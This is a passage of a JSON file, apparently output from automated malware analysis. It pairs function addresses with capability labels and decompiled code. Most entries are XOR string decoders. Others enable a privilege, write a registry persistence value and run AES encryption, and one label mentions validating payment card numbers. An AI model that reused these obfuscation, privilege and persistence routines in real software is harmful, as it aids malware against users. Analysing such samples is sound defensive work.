        "decompiled_code": "\nuint8_t * __fastcall fcn.00401f00(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0xb;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 != 0);\n    param_1[0x17] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 154
    },
    "00401f30": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401f30(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 7;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 4;\n    } while (iVar2 != 0);\n    param_1[0x1d] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 194
    },
    "00401f70": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401f70(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 9;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 3;\n    } while (iVar2 != 0);\n    param_1[0x1c] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 174
    },
    "00402040": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402040(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 7;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 != 0);\n    param_1[0xf] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 151
    },
    "004020b0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.004020b0(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 3;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 5;\n    } while (iVar2 != 0);\n    param_1[0x10] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 213
    },
    "004020f0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004020f0(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0x17;\n    puVar1 = param_1 + 1;\n    do {\n        *puVar1 = *puVar1 ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 != 0);\n    param_1[0x18] = 0;\n    return;\n}\n",
        "token_count": 126
    },
    "00402120": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402120(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0xb;\n    puVar1 = param_1 + 1;\n    do {\n        *puVar1 = *puVar1 ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 != 0);\n    param_1[0xc] = 0;\n    return;\n}\n",
        "token_count": 123
    },
    "00402150": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402150(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 4;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        puVar1[4] = puVar1[4] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 6;\n    } while (iVar2 != 0);\n    param_1[0x19] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 232
    },
    "00402250": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402250(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0xd;\n    puVar1 = param_1 + 1;\n    do {\n        *puVar1 = *puVar1 ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 != 0);\n    param_1[0xe] = 0;\n    return;\n}\n",
        "token_count": 123
    },
    "00402280": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402280(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0x1d;\n    puVar1 = param_1 + 1;\n    do {\n        *puVar1 = *puVar1 ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 != 0);\n    param_1[0x1e] = 0;\n    return;\n}\n",
        "token_count": 127
    },
    "004022b0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.004022b0(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 5;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        puVar1[4] = puVar1[4] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 6;\n    } while (iVar2 != 0);\n    param_1[0x1f] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 234
    },
    "00402300": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402300(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0x13;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 != 0);\n    param_1[0x27] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 154
    },
    "00402330": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402330(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0xb;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 4;\n    } while (iVar2 != 0);\n    param_1[0x2d] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 194
    },
    "00402370": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402370(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 10;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        puVar1[4] = puVar1[4] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 6;\n    } while (iVar2 != 0);\n    param_1[0x3d] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 233
    },
    "004023c0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.004023c0(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 7;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 5;\n    } while (iVar2 != 0);\n    param_1[0x24] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 213
    },
    "00402400": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402400(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0x31;\n    puVar1 = param_1 + 1;\n    do {\n        *puVar1 = *puVar1 ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 != 0);\n    param_1[0x32] = 0;\n    return;\n}\n",
        "token_count": 125
    },
    "00402430": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402430(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0xb;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 3;\n    } while (iVar2 != 0);\n    param_1[0x22] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 173
    },
    "00402470": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402470(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 6;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        puVar1[4] = puVar1[4] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 6;\n    } while (iVar2 != 0);\n    param_1[0x25] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 232
    },
    "00403f40": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00403f40(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 8;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 4;\n    } while (iVar2 != 0);\n    param_1[0x21] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 193
    },
    "00403f80": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00403f80(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0xd;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 5;\n    } while (iVar2 != 0);\n    param_1[0x42] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 214
    },
    "00404210": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00404210(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0x75;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 3;\n    } while (iVar2 != 0);\n    param_1[0x160] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 174
    },
    "00404250": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00404250(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0x2d;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 5;\n    } while (iVar2 != 0);\n    param_1[0xe2] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 215
    },
    "00406c40": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00406c40(uint8_t *param_1)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 9;\n    piVar1 = param_1 + 4;\n    do {\n        piVar1[-1] = *(piVar1 + -1) ^ *param_1;\n        *piVar1 = *param_1 ^ *piVar1;\n        piVar1[1] = *(piVar1 + 1) ^ *param_1;\n        iVar2 = iVar2 + -1;\n        piVar1 = piVar1 + 3;\n    } while (iVar2 != 0);\n    *(param_1 + 0x38) = 0;\n    return param_1 + 2;\n}\n",
        "token_count": 179
    },
    "00406c90": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00406c90(uint8_t *param_1)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 5;\n    piVar1 = param_1 + 4;\n    do {\n        piVar1[-1] = *(piVar1 + -1) ^ *param_1;\n        *piVar1 = *param_1 ^ *piVar1;\n        piVar1[1] = *(piVar1 + 1) ^ *param_1;\n        piVar1[2] = *(piVar1 + 2) ^ *param_1;\n        piVar1[3] = *(piVar1 + 3) ^ *param_1;\n        iVar2 = iVar2 + -1;\n        piVar1 = piVar1 + 5;\n    } while (iVar2 != 0);\n    *(param_1 + 0x34) = 0;\n    return param_1 + 2;\n}\n",
        "token_count": 223
    },
    "00406d00": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00406d00(uint8_t *param_1)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 7;\n    piVar1 = param_1 + 4;\n    do {\n        piVar1[-1] = *(piVar1 + -1) ^ *param_1;\n        *piVar1 = *param_1 ^ *piVar1;\n        piVar1[1] = *(piVar1 + 1) ^ *param_1;\n        piVar1[2] = *(piVar1 + 2) ^ *param_1;\n        piVar1[3] = *(piVar1 + 3) ^ *param_1;\n        iVar2 = iVar2 + -1;\n        piVar1 = piVar1 + 5;\n    } while (iVar2 != 0);\n    *(param_1 + 0x48) = 0;\n    return param_1 + 2;\n}\n",
        "token_count": 223
    },
    "004085f0": {
        "rules": [
            "encode data using XOR",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004085f0(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t *puVar9;\n    int32_t iVar10;\n    uint *arg_8h_00;\n    uint var_38h;\n    uint32_t auStack56 [7];\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint *var_8h;\n    uint *var_4h;\n    \n    arg_8h_00 = &var_38h;\n    var_4h = arg_8h_00;\n    fcn.004124f0(arg_8h_00, 0, 0x30);\n    iVar10 = 0;\n    var_8h = arg_8h + 8;\n    pcVar7 = arg_8h + 0xf;\ncode_r0x00408623:\n    do {\n        *pcVar7 = *pcVar7 + '\\x01';\n        if (*pcVar7 == '\\0') {\n            pcVar7 = pcVar7 + -1;\n            if (0 < pcVar7 + (1 - arg_8h)) goto code_r0x00408623;\n        }\n        iVar8 = fcn.00408a30(arg_8h + 8, 1, arg_8h, arg_8h_00);\n        if (iVar8 != 0) goto code_r0x004086a7;\n        iVar10 = iVar10 + 0x10;\n        arg_8h_00 = var_4h + 4;\n        var_4h = arg_8h_00;\n        pcVar7 = arg_8h + 0xf;\n        if (0x2f < iVar10) {\n            iVar10 = 0;\n            do {\n                puVar9 = &var_38h + iVar10;\n                iVar8 = iVar10 + 0x10;\n                uVar2 = *(auStack56 + iVar10 + 4);\n                uVar3 = *(auStack56 + iVar10 + 8);\n                puVar1 = (arg_ch - &var_38h) + puVar9;\n                uVar4 = puVar1[1];\n                uVar5 = puVar1[2];\n                uVar6 = puVar1[3];\n                *puVar9 = *puVar1 ^ *puVar9;\n                *(auStack56 + iVar10) = uVar4 ^ *(auStack56 + iVar10);\n                *(auStack56 + iVar10 + 4) = uVar5 ^ uVar2;\n                *(auStack56 + iVar10 + 8) = uVar6 ^ uVar3;\n                iVar10 = iVar8;\n            } while (iVar8 < 0x30);\n            iVar8 = fcn.00408aa0(var_8h, &var_38h, 0x100);\n            if (iVar8 == 0) {\n                *arg_8h = var_18h;\n                arg_8h[1] = uStack24;\n                arg_8h[2] = uStack20;\n                arg_8h[3] = uStack16;\n            }\ncode_r0x004086a7:\n            fcn.0040eda0(&var_38h, 0x30);\n            return iVar8;\n        }\n    } while( true );\n}\n",
        "token_count": 809
    },
    "0040f2c0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __fastcall\nfcn.0040f2c0(uchar (*param_1) [16], int32_t param_2, uchar (*param_3) [16], int32_t param_4, uchar (*param_5) [16])\n\n{\n    uchar auVar1 [16];\n    uchar auVar2 [16];\n    uchar auVar3 [16];\n    uchar auVar4 [16];\n    uchar auVar5 [16];\n    uchar auVar6 [16];\n    uchar (*pauVar7) [16];\n    int32_t iVar8;\n    uchar auVar9 [16];\n    \n    auVar9 = *param_3;\n    if (param_2 != 0) {\n        auVar1 = param_1[10];\n        auVar2 = param_1[9];\n        auVar3 = param_1[8];\n        auVar4 = param_1[7];\n        auVar5 = param_1[6];\n        auVar6 = param_1[5];\n        iVar8 = (param_2 - 1U >> 4) + 1;\n        pauVar7 = param_5;\n        do {\n            auVar9 = aesenc(auVar9 ^ *((param_4 - param_5) + -0x10 + pauVar7[1]) ^ *param_1, param_1[1]);\n            auVar9 = aesenc(auVar9, param_1[2]);\n            auVar9 = aesenc(auVar9, param_1[3]);\n            auVar9 = aesenc(auVar9, param_1[4]);\n            auVar9 = aesenc(auVar9, auVar6);\n            auVar9 = aesenc(auVar9, auVar5);\n            auVar9 = aesenc(auVar9, auVar4);\n            auVar9 = aesenc(auVar9, auVar3);\n            auVar9 = aesenc(auVar9, auVar2);\n            auVar9 = aesenclast(auVar9, auVar1);\n            *pauVar7 = auVar9;\n            iVar8 = iVar8 + -1;\n            pauVar7 = pauVar7[1];\n        } while (iVar8 != 0);\n    }\n    return;\n}\n",
        "token_count": 495
    },
    "004125c0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004125c0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint8_t var_31h;\n    ushort var_30h;\n    uint var_2eh;\n    uint uStack46;\n    uint uStack42;\n    uint uStack38;\n    uint var_1eh;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hObject;\n    \n    iVar1 = (*_sym.imp.ntdll.dll_NtOpenProcessToken)(0xffffffff, 0x28, &hObject);\n    if (iVar1 == 0) {\n        var_2eh = *0x423d80;\n        uStack46 = *0x423d84;\n        uStack42 = *0x423d88;\n        uStack38 = *0x423d8c;\n        var_1eh._0_1_ = 0x4a;\n        var_1eh._1_1_ = 0;\n        uVar2 = fcn.00401c50();\n        (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, uVar2, &var_ch);\n        var_18h = var_ch;\n        var_14h = var_8h;\n        stack0xffffffe0 = 1;\n        var_10h = 2;\n        uVar2 = hObject;\n        iVar1 = (*_sym.imp.ntdll.dll_NtAdjustPrivilegesToken)(hObject, 0, &var_1eh + 2, 0x10, 0, 0);\n        if (iVar1 != 0) {\n            uVar3 = 0;\n            var_31h = *0x423f10;\n            var_30h = *0x423f10 >> 8;\n            var_2eh._1_3_ = *0x423f14;\n            var_2eh = CONCAT31(var_2eh._1_3_, *0x423f10 >> 0x18);\n            uStack46._1_3_ = *0x423f18;\n            uStack46 = CONCAT31(uStack46._1_3_, *0x423f14 >> 0x18);\n            uStack42._1_3_ = *0x423f1c;\n            uStack42 = CONCAT31(uStack42._1_3_, *0x423f18 >> 0x18);\n            uStack38 = CONCAT31(0x533c26, *0x423f1c >> 0x18);\n            var_1eh._0_1_ = 0x57;\n            do {\n                *(&var_30h + uVar3) = *(&var_30h + uVar3) ^ var_31h;\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < 0x13);\n            var_1eh._1_1_ = 0;\n            fcn.0040f630(&var_30h, uVar2);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return;\n}\n",
        "token_count": 719
    },
    "00416b00": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.00416b00(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    int32_t in_FS_OFFSET;\n    bool bVar7;\n    uint lpString1;\n    uint lpString2;\n    uint var_9ah;\n    uint var_6bh;\n    uint uStack107;\n    uint uStack103;\n    uint uStack99;\n    uint var_5bh;\n    uint uStack91;\n    uint uStack87;\n    uint uStack83;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_38h;\n    uint var_34h;\n    uint var_2fh;\n    uint uStack47;\n    uint uStack43;\n    uint uStack39;\n    uint var_1fh;\n    uchar var_1bh;\n    uint var_1ah;\n    uint var_16h;\n    uint var_12h;\n    uint var_eh;\n    uint16_t var_ah;\n    uint16_t var_8h;\n    ushort var_6h;\n    uint hKey;\n    \n    var_6bh = str.l_8____0_._0_4_;\n    uStack107 = str.l_8____0_._4_4_;\n    uStack103 = str.l_8____0_._8_4_;\n    uStack99 = *0x423c3c;\n    var_38h = 1;\n    var_5bh = *0x423c10;\n    uStack91 = *0x423c14;\n    uStack87 = *0x423c18;\n    uStack83 = *0x423c1c;\n    var_4bh = 0x3a180209;\n    var_47h = 0x51f1e09;\n    var_43h = 0x3e300203;\n    var_3fh._0_2_ = 0x219;\n    var_3fh._2_1_ = 0;\n    uVar2 = fcn.00401370();\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, uVar2, 0, 0, 0, 0x2001f, 0, &hKey, &var_3fh + 3);\n    if (iVar3 != 0) {\n        return false;\n    }\n    fcn.00402d50(extraout_ECX, stack0xffffffc0);\n    uVar2 = fcn.00401d50();\n    if (param_1 != 0) {\n        uVar5 = hKey;\n        (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, uVar2);\n        uVar4 = 0;\n        var_2fh = *0x423c90;\n        uStack47 = *0x423c94;\n        uStack43 = *0x423c98;\n        uStack39 = *0x423c9c;\n        var_1fh = 0x322e206b;\n        do {\n            var_2fh._0_1_ = *0x423c90;\n            puVar1 = &var_2fh + uVar4 + 1;\n            *puVar1 = *puVar1 ^ var_2fh;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x13);\n        var_1bh = 0;\n        fcn.0040f630(&var_2fh + 1, uVar5);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return true;\n    }\n    var_eh._0_2_ = *0x4224fe ^ 0x3a;\n    var_34h = 0x104;\n    var_eh._2_2_ = *0x422500 ^ 0x3a;\n    var_1ah = 0x18003a;\n    var_ah = *0x422500 >> 0x10 ^ 0x3a;\n    var_16h = 0x49001f;\n    var_8h = *0x422504 ^ 0x3a;\n    var_12h = 0x3a0018;\n    var_6h = 0;\n    uVar5 = fcn.00401400(*(*(*(in_FS_OFFSET + 0x30) + 0x10) + 0x3c));\n    iVar3 = (*_sym.imp.USER32.dll_wsprintfW)(&lpString2, uVar5);\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, uVar2, 0, &var_38h, &lpString1, &var_34h);\n    if (iVar6 == 0) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&lpString1, &lpString2);\n        bVar7 = iVar6 == 0;\n        if (bVar7) goto code_r0x00416ccc;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, uVar2, 0, 1, &lpString2, iVar3 * 2);\n    bVar7 = iVar3 == 0;\ncode_r0x00416ccc:\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return bVar7;\n}\n",
        "token_count": 1266
    },
    "00401080": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00401080(uint *param_1)\n\n{\n    *param_1 = 0xf7c0a2f;\n    param_1[1] = 0x5b0f5c0a;\n    param_1[2] = 0x434e5b40;\n    param_1[3] = 0xa0f000f;\n    param_1[4] = 0x5d490f5c;\n    *(param_1 + 5) = 0x4a4a;\n    *(param_1 + 0x16) = 0;\n    return param_1;\n}\n",
        "token_count": 145
    },
    "00401400": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401400(uint8_t *param_1)\n\n{\n    *(param_1 + 2) = param_1[2] ^ *param_1;\n    *(param_1 + 4) = param_1[4] ^ *param_1;\n    *(param_1 + 6) = param_1[6] ^ *param_1;\n    *(param_1 + 8) = param_1[8] ^ *param_1;\n    *(param_1 + 10) = param_1[10] ^ *param_1;\n    *(param_1 + 0xc) = param_1[0xc] ^ *param_1;\n    *(param_1 + 0xe) = param_1[0xe] ^ *param_1;\n    *(param_1 + 0x10) = param_1[0x10] ^ *param_1;\n    *(param_1 + 0x12) = param_1[0x12] ^ *param_1;\n    *(param_1 + 0x14) = 0;\n    return param_1 + 2;\n}\n",
        "token_count": 257
    },
    "004014d0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004014d0(uint *param_1)\n\n{\n    *param_1 = 0x620023;\n    param_1[1] = 0x4a0051;\n    param_1[2] = 0x4f0042;\n    *(param_1 + 3) = 0x23;\n    *(param_1 + 0xe) = *0x41da54 ^ 0x23;\n    *(param_1 + 4) = *0x41da54 >> 0x10 ^ 0x23;\n    *(param_1 + 0x12) = *0x41da58 ^ 0x23;\n    *(param_1 + 5) = *0x41da58 >> 0x10 ^ 0x23;\n    *(param_1 + 0x16) = str.image_bmp._0_4_ ^ 0x23;\n    *(param_1 + 6) = 0;\n    return param_1;\n}\n",
        "token_count": 226
    },
    "00401540": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
